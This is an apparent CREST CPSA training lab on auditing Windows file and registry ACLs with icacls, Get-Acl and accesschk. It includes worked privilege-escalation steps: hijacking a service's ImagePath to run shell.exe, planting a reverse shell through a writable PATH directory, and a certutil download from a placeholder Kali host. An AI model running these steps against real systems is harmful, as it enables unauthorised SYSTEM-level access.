Understanding ACL Notation with icacls

icacls

Before scanning, understand what icacls output means. The permission flags are what you will be reading throughout this lab and reporting in findings:

# Run icacls on a directory to see its ACL
icacls "C:\Program Files"

C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(M)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(M)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)

The flags you must know for CPSA:

FlagMeaningRisk if granted to low-priv user
(F)Full ControlCRITICAL - complete ownership
(M)Modify (read/write/execute/delete, not change perms)HIGH - can replace binaries
(W)WriteHIGH - can write new files
(RX)Read and ExecuteExpected - read-only
(R)Read onlyExpected
(OI)Object Inherit - applies to child filesCheck inherited perms carefully
(CI)Container Inherit - applies to subfoldersInherited write is still write
(IO)Inherit Only - does not apply to this object directlyContext-dependent
★
CREST CPSA Exam Point: CPSA B13 specifically tests your ability to interpret Windows file system permissions and identify misconfigurations. Know the difference between (F), (M), and (W) - all three allow an attacker to write files; only (F) allows changing the ACL itself. In a report, state the specific flag, not just "write access".

Auditing Service Directories for Writable Paths

icacls / Service Hijack

Service binaries running as SYSTEM are high-value targets. If a low-privileged user can write to the binary path or its parent directory, they can replace the binary and get SYSTEM. Start with the Syntex custom services:

# List all non-Microsoft services and their binary paths
wmic service where "not PathName like '%System32%' and not PathName like '%SysWOW64%'" get Name, PathName, StartMode, State

Name               PathName                                              StartMode  State
SyntexBackup       C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe  Auto   Running
SyntexMonitor      C:\SyntexMonitor\SyntexMon.exe                            Auto   Running
SyntexAgent        C:\Program Files\Syntex\Agent\SyntexAgent.exe             Manual Stopped

# Now check ACLs on each binary and its directory
icacls "C:\SyntexMonitor"
C:\SyntexMonitor BUILTIN\Users:(OI)(CI)(F)
                 NT AUTHORITY\SYSTEM:(F)
# FINDING: Users have Full Control on the SyntexMonitor directory
# Anyone can replace C:\SyntexMonitor\SyntexMon.exe with a malicious binary

icacls "C:\Program Files\Syntex Solutions"
C:\Program Files\Syntex Solutions BUILTIN\Users:(OI)(CI)(W)
# FINDING: Users have Write access - unquoted path attack possible (from E3-A)

Use PowerShell Get-Acl for structured output better suited to scripting and reporting:

# Get-Acl gives you the full ACL object - good for reporting
Get-Acl "C:\SyntexMonitor\SyntexMon.exe" | Format-List

Path   : Microsoft.PowerShell.Core\FileSystem::C:\SyntexMonitor\SyntexMon.exe
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl

# For a concise one-liner across multiple paths:
"C:\SyntexMonitor","C:\Program Files\Syntex Solutions","C:\Scripts" | ForEach-Object {
    $acl = Get-Acl $_
    $acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|Authenticated" } |
    Select-Object @{n='Path';e={$_}}, IdentityReference, FileSystemRights
}
⚠
Reporting Note: When you document an ACL finding, include the exact output of icacls as evidence, the specific identity (BUILTIN\Users, Everyone, etc.), the permission granted, and the attack path it enables. Generic statements like "insecure permissions" are not sufficient for a CPSA-level report.

Scanning for Writable Directories in System PATH

PATH Hijacking

If a directory in the system PATH is writable by non-administrative users, an attacker can plant a malicious executable that runs in place of a legitimate one. This is a PATH hijacking vulnerability:

# Get all directories in the system PATH
$env:PATH -split ";" | ForEach-Object {
    $path = $_
    try {
        $acl = Get-Acl $path -ErrorAction Stop
        $writableBy = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|Modify|FullControl" -and
            $_.IdentityReference -match "Users|Everyone|Authenticated"
        }
        if ($writableBy) { Write-Host "[WRITABLE]" $path -ForegroundColor Red }
    } catch {}
}

[WRITABLE] C:\SyntexTools
[OK] C:\Windows\System32
[OK] C:\Windows

# C:\SyntexTools is in PATH and writable by Users - PATH hijack possible
# If any admin runs a command that resolves via PATH, our binary runs first

To exploit a writable PATH directory, identify a command that administrators or services use and plant a trojanised version:

# Example: if 'backup.exe' is called by a scheduled task running as SYSTEM
# and C:\SyntexTools is before C:\Windows\System32 in PATH...
# Plant our reverse shell as backup.exe in C:\SyntexTools

# Document the PATH order - this matters for the report
$env:PATH -split ";"

C:\SyntexTools           <-- attacker-writable, first in PATH
C:\Windows\System32
C:\Windows
C:\Windows\System32\Wbem

Registry ACL Audit

Registry / CPSA B13

Registry ACLs control who can read and modify registry keys. Writable keys in HKLM (which affects all users and services) are particularly dangerous. The two highest-value targets for privilege escalation are service configuration and the Run keys:

# Check ACL on a service's registry key
# Service config lives at HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>

Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\SyntexMonitor" | Format-List

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SyntexMonitor
Owner  : BUILTIN\Administrators
Access : BUILTIN\Users Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl

# FINDING: Users have FullControl on the SyntexMonitor service registry key
# An attacker can change the ImagePath value to point to a malicious binary
# This achieves SYSTEM without touching the filesystem ACLs at all

Demonstrate the registry-based service hijack - change the ImagePath directly:

# With write access to the service key, change ImagePath
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SyntexMonitor" /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SyntexMonitor
    ImagePath    REG_EXPAND_SZ    C:\SyntexMonitor\SyntexMon.exe

# Modify ImagePath to run our payload instead
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SyntexMonitor" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f

The operation completed successfully.

# Restart the service to trigger execution as SYSTEM
sc stop SyntexMonitor
sc start SyntexMonitor
# Shell received on listener - no filesystem write needed

Audit the Run and RunOnce keys - writable Run keys under HKLM allow persistence and privilege escalation:

# Check Run key ACLs
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Select-Object -ExpandProperty Access |
    Where-Object { $_.IdentityReference -match "Users|Everyone" }

# Check for AutoRun entries that might execute on next login
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Also check the AlwaysInstallElevated policy keys (from E3-A)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
★
CREST CPSA Exam Point (B13): Registry ACL misconfigurations are a distinct finding class from file system ACLs. In a CPSA exam scenario, you may be asked to identify whether a privilege escalation route used a file ACL or a registry ACL - these are different vulnerability types with different remediations. A writable service ImagePath key requires changing the registry key ACL, not the file ACL.

Rapid ACL Sweep with accesschk

Sysinternals

Sysinternals accesschk.exe is a purpose-built tool for ACL auditing. It is faster than manual icacls checks and can sweep entire directory trees. It is commonly used in real engagements and may appear in CPSA exam scenarios:

# Download accesschk from your Kali HTTP server
certutil -urlcache -split -f http://<KALI-IP>:8080/accesschk.exe accesschk.exe

# Find all services writable by Authenticated Users
accesschk.exe -uwcqv "Authenticated Users" *

RW SyntexMonitor
   SERVICE_ALL_ACCESS

# Find writable directories in Program Files
accesschk.exe -uwdqs Users "C:\Program Files"
accesschk.exe -uwdqs "Everyone" "C:\"

C:\Scripts
C:\SyntexMonitor
C:\SyntexTools

# Find writable registry keys under HKLM\Services
accesschk.exe -uwks "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services
ℹ
Tip: On a live engagement, run accesschk.exe -accepteula on first launch to suppress the EULA dialog. In the Syntex lab, the EULA is pre-accepted. The -q flag suppresses the banner, -u suppresses errors, -w shows only writable, -c is services, -d is directories, -s is recursive.

Knowledge Check

Q1. icacls shows BUILTIN\Users:(OI)(CI)(W) on a service binary directory. Which statement is correct?

A. Users can read and execute files in the directory but not create new ones
B. Users can write new files into the directory, and that permission inherits to subfolders and files
C. Users have Full Control including the ability to change the ACL itself
D. Only the directory owner can write files; other users are read-only

Q2. You find that BUILTIN\Users has FullControl on HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc. What is the most direct exploitation path?

Modify the ImagePath registry value to point to a malicious executable, then restart the service. The service runs as SYSTEM, so your payload executes with SYSTEM privileges. This is a registry ACL misconfiguration (CPSA B13) and is distinct from file ACL exploitation - the filesystem binary itself may have correct permissions, but the registry key controlling which binary runs does not.

Q3. What CPSA reference covers file system and registry ACL misconfigurations?

A. CPSA E3 - Privilege Escalation
B. CPSA B13 - Windows File System Permissions and Registry ACLs
C. CPSA E5 - Post-exploitation
D. CPSA J1 - Application Layer

Key Takeaways

  • icacls and Get-Acl are your primary tools for file ACL auditing - know the flag notation for CPSA
  • BUILTIN\Users or Everyone with (W), (M), or (F) on a service directory or binary is always a HIGH finding
  • Registry ACL misconfigurations (writable service keys) are a separate finding class from file ACL issues
  • A writable ImagePath registry key gives the same result as a writable binary - SYSTEM code execution
  • accesschk.exe sweeps faster than manual icacls checks - use it on engagements where time is limited
  • Every finding needs the exact ACL output as evidence, not a generic statement
